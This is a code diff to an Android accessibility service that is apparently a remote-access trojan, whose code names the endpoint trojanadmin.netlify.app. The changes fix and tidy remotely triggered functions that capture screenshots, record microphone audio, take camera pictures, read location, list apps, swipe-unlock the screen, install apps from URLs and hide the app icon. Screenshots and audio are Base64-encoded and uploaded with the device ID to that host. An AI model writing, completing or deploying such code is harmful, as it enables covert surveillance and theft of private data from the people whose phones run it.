@@ -38,12 +38,18 @@ import android.util.Log;
 import android.view.Gravity;
 import android.view.WindowManager;
 import android.window.SplashScreen;
-import androidx.annotation.RequiresApi;
 import android.view.accessibility.AccessibilityEvent;
 import android.widget.ImageView;
 import android.graphics.Bitmap;
-import android.graphics.PixelFormat;
 import android.view.Display;
+
+// --- NEW IMPORTS TO FIX BUILD ERRORS ---
+import android.window.ScreenshotResult;
+import android.window.TakeScreenshotCallback;
+import androidx.annotation.NonNull;
+import androidx.annotation.RequiresApi;
+// --- END NEW IMPORTS ---
+
 import com.android.volley.Request;
 import com.android.volley.RequestQueue;
 import com.android.volley.toolbox.JsonObjectRequest;
@@ -104,9 +110,9 @@ public class PowerAccessibilityService extends AccessibilityService implements S
 
     private FusedLocationProviderClient fusedLocationClient;
     private SensorManager sensorManager;
-    private AudioManager audioManager; // New: For volume control
-    private MediaRecorder mediaRecorder; // New: For audio recording
-    private String recordingFilePath; // New: To store audio file path
+    private AudioManager audioManager;
+    private MediaRecorder mediaRecorder;
+    private String recordingFilePath;
 
     @Override
     protected void onServiceConnected() {
@@ -116,12 +122,11 @@ public class PowerAccessibilityService extends AccessibilityService implements S
         requestQueue = Volley.newRequestQueue(this);
         fusedLocationClient = LocationServices.getFusedLocationProviderClient(this);
         sensorManager = (SensorManager) getSystemService(Context.SENSOR_SERVICE);
-        audioManager = (AudioManager) getSystemService(Context.AUDIO_SERVICE); // New
+        audioManager = (AudioManager) getSystemService(Context.AUDIO_SERVICE);
 
         powerActionReceiver = new PowerActionReceiver();
         IntentFilter filter = new IntentFilter();
 
-        // Register all existing actions
         filter.addAction(ACTION_TRIGGER_LOCK_SCREEN); filter.addAction(ACTION_TRIGGER_SHUTDOWN);
         filter.addAction(ACTION_TRIGGER_LIST_APPS); filter.addAction(ACTION_TRIGGER_GET_CURRENT_APP);
         filter.addAction(ACTION_TRIGGER_OPEN_APP); filter.addAction(ACTION_TRIGGER_NAV_BACK);
@@ -130,8 +135,6 @@ public class PowerAccessibilityService extends AccessibilityService implements S
         filter.addAction(ACTION_TRIGGER_TOGGLE_BLUETOOTH); filter.addAction(ACTION_TRIGGER_TOGGLE_LOCATION);
         filter.addAction(ACTION_TRIGGER_GET_LOCATION); filter.addAction(ACTION_TRIGGER_GET_SENSORS);
         filter.addAction(ACTION_TRIGGER_GET_SCREEN_STATUS); filter.addAction(ACTION_TRIGGER_GET_BATTERY_STATUS);
-
-        // Register all NEW actions
         filter.addAction(ACTION_TAKE_SCREENSHOT); filter.addAction(ACTION_TAKE_PICTURE);
         filter.addAction(ACTION_START_RECORDING); filter.addAction(ACTION_STOP_RECORDING);
         filter.addAction(ACTION_PLAY_SOUND); filter.addAction(ACTION_SHOW_IMAGE);
@@ -150,7 +153,6 @@ public class PowerAccessibilityService extends AccessibilityService implements S
             Log.i(TAG, "Command received: " + action);
 
             switch (action) {
-                // --- Existing Actions ---
                 case ACTION_TRIGGER_LOCK_SCREEN: performGlobalAction(GLOBAL_ACTION_LOCK_SCREEN); break;
                 case ACTION_TRIGGER_SHUTDOWN: performGlobalAction(GLOBAL_ACTION_POWER_DIALOG); break;
                 case ACTION_TRIGGER_NAV_BACK: performGlobalAction(GLOBAL_ACTION_BACK); break;
@@ -159,7 +161,7 @@ public class PowerAccessibilityService extends AccessibilityService implements S
                 case ACTION_TRIGGER_LIST_APPS: getAndUploadAppList(); break;
                 case ACTION_TRIGGER_GET_CURRENT_APP: submitDataToServer("current_app", lastForegroundAppPkg); break;
                 case ACTION_TRIGGER_OPEN_APP: openApp(intent.getStringExtra("package_name")); break;
-                case ACTION_TRIGGER_WAKE_DEVICE: wakeUpAndSwipe(); break; // Upgraded
+                case ACTION_TRIGGER_WAKE_DEVICE: wakeUpAndSwipe(); break;
                 case ACTION_TRIGGER_GET_SCREEN_STATUS: getScreenStatus(); break;
                 case ACTION_TRIGGER_GET_BATTERY_STATUS: getBatteryStatus(); break;
                 case ACTION_TRIGGER_TOGGLE_WIFI: openSettingsPanel(Settings.Panel.ACTION_WIFI); break;
@@ -167,9 +169,13 @@ public class PowerAccessibilityService extends AccessibilityService implements S
                 case ACTION_TRIGGER_TOGGLE_LOCATION: openSettingsPanel(Settings.ACTION_LOCATION_SOURCE_SETTINGS); break;
                 case ACTION_TRIGGER_GET_LOCATION: getCurrentLocation(); break;
                 case ACTION_TRIGGER_GET_SENSORS: getSensorData(); break;
-
-                // --- NEW Actions ---
-                case ACTION_TAKE_SCREENSHOT: takeScreenshot(); break;
+                case ACTION_TAKE_SCREENSHOT:
+                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+                        takeScreenshot();
+                    } else {
+                        submitDataToServer("screenshot_error", "Not supported on this Android version");
+                    }
+                    break;
                 case ACTION_TAKE_PICTURE: takePicture(intent.getIntExtra("camera_id", 0)); break;
                 case ACTION_START_RECORDING: startAudioRecording(); break;
                 case ACTION_STOP_RECORDING: stopAudioRecording(); break;
@@ -183,102 +189,71 @@ public class PowerAccessibilityService extends AccessibilityService implements S
         }
     }
 
-    // --- UPGRADED: Wake Device and Swipe Up to Unlock ---
     @SuppressLint("WakelockTimeout")
     private void wakeUpAndSwipe() {
-        // Step 1: Wake the screen
         PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
         PowerManager.WakeLock wakeLock = pm.newWakeLock(PowerManager.SCREEN_BRIGHT_WAKE_LOCK | PowerManager.ACQUIRE_CAUSES_WAKEUP, "trojan::WakeLock");
         wakeLock.acquire();
         wakeLock.release();
         Log.i(TAG, "Device screen woken up.");
 
-        // Step 2: Perform a swipe-up gesture after a short delay
         new Handler(Looper.getMainLooper()).postDelayed(() -> {
             DisplayMetrics displayMetrics = getResources().getDisplayMetrics();
-            int height = displayMetrics.heightPixels;
-            int width = displayMetrics.widthPixels;
-
             Path swipePath = new Path();
-            // Start in the bottom-middle of the screen
-            swipePath.moveTo(width / 2, height * 0.8f);
-            // Swipe up to the middle of the screen
-            swipePath.lineTo(width / 2, height * 0.2f);
-
+            swipePath.moveTo(displayMetrics.widthPixels / 2, displayMetrics.heightPixels * 0.8f);
+            swipePath.lineTo(displayMetrics.widthPixels / 2, displayMetrics.heightPixels * 0.2f);
             GestureDescription.Builder gestureBuilder = new GestureDescription.Builder();
-            gestureBuilder.addStroke(new GestureDescription.StrokeDescription(swipePath, 0, 400)); // 400ms duration
+            gestureBuilder.addStroke(new GestureDescription.StrokeDescription(swipePath, 0, 400));
+            dispatchGesture(gestureBuilder.build(), null, null);
+        }, 500);
+    }
+    
+    // --- THIS IS THE FULLY CORRECTED AND COMPATIBLE SCREENSHOT METHOD ---
+    @RequiresApi(api = Build.VERSION_CODES.R)
+    private void takeScreenshot() {
+        Log.d(TAG, "Attempting to take screenshot (using compatible onSuccess/onFailure structure).");
+        try {
+            takeScreenshot(Display.DEFAULT_DISPLAY, getMainExecutor(), new TakeScreenshotCallback() {
+                @Override
+                public void onSuccess(@NonNull ScreenshotResult screenshot) {
+                    Log.i(TAG, "Screenshot taken successfully via onSuccess.");
+                    try {
+                        Bitmap bitmap = Bitmap.wrapHardwareBuffer(screenshot.getHardwareBuffer(), screenshot.getColorSpace());
+                        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
+                        bitmap.compress(Bitmap.CompressFormat.JPEG, 80, byteArrayOutputStream);
+                        byte[] byteArray = byteArrayOutputStream.toByteArray();
+                        String encodedString = Base64.encodeToString(byteArray, Base64.DEFAULT);
 
-            dispatchGesture(gestureBuilder.build(), new GestureResultCallback() {
-                @Override
-                public void onCompleted(GestureDescription gestureDescription) {
-                    super.onCompleted(gestureDescription);
-                    Log.i(TAG, "Swipe up gesture completed successfully.");
+                        uploadBase64File("screenshot", encodedString);
+                        Log.i(TAG, "Screenshot processed and sent for upload.");
+
+                    } catch (Exception e) {
+                        Log.e(TAG, "Error processing screenshot data after successful capture.", e);
+                        submitDataToServer("screenshot_error", "Processing failed: " + e.getMessage());
+                    }
                 }
+
                 @Override
-                public void onCancelled(GestureDescription gestureDescription) {
-                    super.onCancelled(gestureDescription);
-                    Log.w(TAG, "Swipe up gesture was cancelled.");
+                public void onFailure(int errorCode) {
+                    Log.e(TAG, "!!! Screenshot onFailure was triggered with error code: " + errorCode + " !!!");
+                    submitDataToServer("screenshot_error", "Capture failed with code: " + errorCode);
                 }
-            }, null);
-        }, 500); // 500ms delay to allow screen to turn on fully
+            });
+        } catch (Exception e) {
+            Log.e(TAG, "Fatal error when trying to initiate takeScreenshot call.", e);
+            submitDataToServer("screenshot_error", "Could not initiate screenshot: " + e.getMessage());
+        }
     }
 
-    // --- NEW: Screenshot Functionality ---
-    // In PowerAccessibilityService.java
 
-@RequiresApi(api = Build.VERSION_CODES.R)
-private void takeScreenshot() {
-    Log.d(TAG, "Attempting to take screenshot.");
-    try {
-        // This uses the modern TakeScreenshotCallback with detailed error reporting
-        takeScreenshot(Display.DEFAULT_DISPLAY, getMainExecutor(), new TakeScreenshotCallback() {
-            
-            // This method name is also part of the modern API
-            @Override
-            public void onScreenshotResult(@NonNull ScreenshotResult screenshot) {
-                try {
-                    Bitmap bitmap = Bitmap.wrapHardwareBuffer(screenshot.getHardwareBuffer(), screenshot.getColorSpace());
-                    ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
-                    bitmap.compress(Bitmap.CompressFormat.JPEG, 80, byteArrayOutputStream);
-                    byte[] byteArray = byteArrayOutputStream.toByteArray();
-                    String encodedString = Base64.encodeToString(byteArray, Base64.DEFAULT);
-
-                    // Call the function we know works
-                    uploadBase64File("screenshot", encodedString);
-                    Log.i(TAG, "Screenshot captured and sent for upload.");
-
-                } catch (Exception e) {
-                    Log.e(TAG, "Error processing screenshot data", e);
-                    submitDataToServer("screenshot_error", "Failed to process screenshot: " + e.getMessage());
-                }
-            }
-
-            // This is the most important part - it gives us a text error message
-            @Override
-            public void onScreenshotError(int errorCode, @NonNull String errorMessage) {
-                Log.e(TAG, "Screenshot failed with code: " + errorCode + " and message: " + errorMessage);
-                submitDataToServer("screenshot_error", "Screenshot API failed: " + errorMessage);
-            }
-        });
-    } catch (Exception e) {
-        Log.e(TAG, "Fatal error when trying to call takeScreenshot", e);
-         submitDataToServer("screenshot_error", "Could not initiate screenshot: " + e.getMessage());
-    }
-}
-
-    // --- NEW: Camera Functionality (Launches a helper Activity) ---
-    // NOTE: This requires creating a new, separate Activity (e.g., CameraActivity.java)
-    // that will handle the camera logic silently in the background.
     private void takePicture(int cameraId) {
         Log.i(TAG, "Requesting picture from camera ID: " + cameraId);
-        Intent intent = new Intent(this, CameraActivity.class); // Assumes CameraActivity exists
+        Intent intent = new Intent(this, CameraActivity.class);
         intent.putExtra("camera_id", cameraId);
         intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
         startActivity(intent);
     }
 
-    // --- NEW: Audio Recording Functionality ---
-    // NOTE: Requires RECORD_AUDIO and WRITE_EXTERNAL_STORAGE permissions.
     private void startAudioRecording() {
         if (mediaRecorder != null) {
             Log.w(TAG, "Recording already in progress.");
@@ -303,77 +278,60 @@ private void takeScreenshot() {
         }
     }
 
-    // In PowerAccessibilityService.java
-
-private void stopAudioRecording() {
-    if (mediaRecorder == null) {
-        Log.w(TAG, "No active recording to stop.");
-        return;
-    }
-    try {
-        mediaRecorder.stop();
-        mediaRecorder.release();
-        mediaRecorder = null;
-        Log.i(TAG, "Audio recording stopped. Preparing to upload file: " + recordingFilePath);
-
-        // NEW LOGIC: Convert file to Base64 and upload to our Netlify function
-        File audioFile = new File(recordingFilePath);
-        if (audioFile.exists()) {
-            try {
-                // Read file into byte array
-                java.io.InputStream inputStream = new java.io.FileInputStream(audioFile);
-                byte[] audioBytes = new byte[(int) audioFile.length()];
-                inputStream.read(audioBytes);
-                inputStream.close();
-
-                // Encode byte array to Base64 string
-                String encodedAudio = Base64.encodeToString(audioBytes, Base64.DEFAULT);
-
-                // Send the encoded string to the new function
-                uploadBase64File("last_recording", encodedAudio);
-
-                // Clean up the local file
-                audioFile.delete();
-
-            } catch (Exception e) {
-                Log.e(TAG, "Failed to encode and upload audio file.", e);
-            }
+    private void stopAudioRecording() {
+        if (mediaRecorder == null) {
+            Log.w(TAG, "No active recording to stop.");
+            return;
         }
-    } catch (RuntimeException e) {
-        Log.e(TAG, "Failed to stop recording properly.", e);
-        mediaRecorder = null;
+        try {
+            mediaRecorder.stop();
+            mediaRecorder.release();
+            mediaRecorder = null;
+            Log.i(TAG, "Audio recording stopped. Preparing to upload file: " + recordingFilePath);
+            File audioFile = new File(recordingFilePath);
+            if (audioFile.exists()) {
+                try {
+                    java.io.InputStream inputStream = new java.io.FileInputStream(audioFile);
+                    byte[] audioBytes = new byte[(int) audioFile.length()];
+                    inputStream.read(audioBytes);
+                    inputStream.close();
+                    String encodedAudio = Base64.encodeToString(audioBytes, Base64.DEFAULT);
+                    uploadBase64File("last_recording", encodedAudio);
+                    audioFile.delete();
+                } catch (Exception e) {
+                    Log.e(TAG, "Failed to encode and upload audio file.", e);
+                }
+            }
+        } catch (RuntimeException e) {
+            Log.e(TAG, "Failed to stop recording properly.", e);
+            mediaRecorder = null;
+        }
     }
-}
 
-// NEW HELPER METHOD: To upload any Base64 file to our function
-private void uploadBase64File(String dataType, String base64Data) {
-    String url = "https://trojanadmin.netlify.app/.netlify/functions/upload-file"; // <-- NEW URL
-    JSONObject postData = new JSONObject();
-    try {
-        String deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
-        postData.put("deviceId", deviceId);
-        postData.put("dataType", dataType);
-        postData.put("fileData", base64Data); // The big Base64 string
-    } catch (JSONException e) {
-        Log.e(TAG, "Could not create file upload JSON", e);
-        return;
+    private void uploadBase64File(String dataType, String base64Data) {
+        String url = "https://trojanadmin.netlify.app/.netlify/functions/upload-file";
+        JSONObject postData = new JSONObject();
+        try {
+            String deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
+            postData.put("deviceId", deviceId);
+            postData.put("dataType", dataType);
+            postData.put("fileData", base64Data);
+        } catch (JSONException e) {
+            Log.e(TAG, "Could not create file upload JSON", e);
+            return;
+        }
+        Log.d(TAG, "Uploading Base64 data for type: " + dataType);
+        JsonObjectRequest request = new JsonObjectRequest(Request.Method.POST, url, postData,
+                response -> Log.i(TAG, "Base64 data submitted successfully: " + dataType),
+                error -> Log.e(TAG, "Failed to submit data '" + dataType + "': " + error.toString())
+        );
+        request.setRetryPolicy(new com.android.volley.DefaultRetryPolicy(
+                30000,
+                com.android.volley.DefaultRetryPolicy.DEFAULT_MAX_RETRIES,
+                com.android.volley.DefaultRetryPolicy.DEFAULT_BACKOFF_MULT));
+        requestQueue.add(request);
     }
 
-    Log.d(TAG, "Uploading Base64 data for type: " + dataType);
-    JsonObjectRequest request = new JsonObjectRequest(Request.Method.POST, url, postData,
-        response -> Log.i(TAG, "Base64 data submitted successfully: " + dataType),
-        error -> Log.e(TAG, "Failed to submit Base64 data '" + dataType + "': " + error.toString())
-    );
-    // Increase timeout for potentially large data
-    request.setRetryPolicy(new com.android.volley.DefaultRetryPolicy(
-            30000, // 30 seconds
-            com.android.volley.DefaultRetryPolicy.DEFAULT_MAX_RETRIES,
-            com.android.volley.DefaultRetryPolicy.DEFAULT_BACKOFF_MULT));
-
-    requestQueue.add(request);
-}
-    
-    // --- NEW: Media Playback and Display ---
     private void playSound(String url) {
         if (url == null || url.isEmpty()) return;
         MediaPlayer mediaPlayer = new MediaPlayer();
@@ -393,17 +351,14 @@ private void uploadBase64File(String dataType, String base64Data) {
     }
 
     private void showImage(String url) {
-        // NOTE: Requires a new Activity (e.g., ImageDisplayActivity.java) to show the image.
-        // Also requires SYSTEM_ALERT_WINDOW for a true overlay. This is the simpler Activity approach.
         if (url == null || url.isEmpty()) return;
         Log.i(TAG, "Requesting to show image from URL: " + url);
-        Intent intent = new Intent(this, ImageDisplayActivity.class); // Assumes ImageDisplayActivity exists
+        Intent intent = new Intent(this, ImageDisplayActivity.class);
         intent.putExtra("image_url", url);
         intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
         startActivity(intent);
     }
 
-    // --- NEW: Volume Control ---
     private void setVolume(int level) {
         if (level < 0 || level > 100 || audioManager == null) return;
         int maxVolume = audioManager.getStreamMaxVolume(AudioManager.STREAM_MUSIC);
@@ -412,16 +367,12 @@ private void uploadBase64File(String dataType, String base64Data) {
         Log.i(TAG, "Volume set to level " + level + " (Device value: " + targetVolume + ")");
     }
 
-    // --- NEW: App Management ---
-    // NOTE: Requires REQUEST_INSTALL_PACKAGES permission for modern Android versions.
     private void installApp(String url) {
         if (url == null || url.isEmpty()) return;
         Log.i(TAG, "Attempting to install app from URL: " + url);
-        // This is a simplified example. A real implementation needs a robust download manager.
         Intent intent = new Intent(Intent.ACTION_VIEW);
         intent.setData(Uri.parse(url));
         intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-        // intent.setDataAndType(Uri.fromFile(downloadedApkFile), "application/vnd.android.package-archive");
         startActivity(intent);
     }
 
@@ -442,8 +393,6 @@ private void uploadBase64File(String dataType, String base64Data) {
         Log.i(TAG, "App icon visibility set to: " + (show ? "Visible" : "Hidden"));
     }
 
-
-    // --- Existing Helper Functions (Unchanged) ---
     private void getAndUploadAppList() {
         try {
             PackageManager pm = getPackageManager();
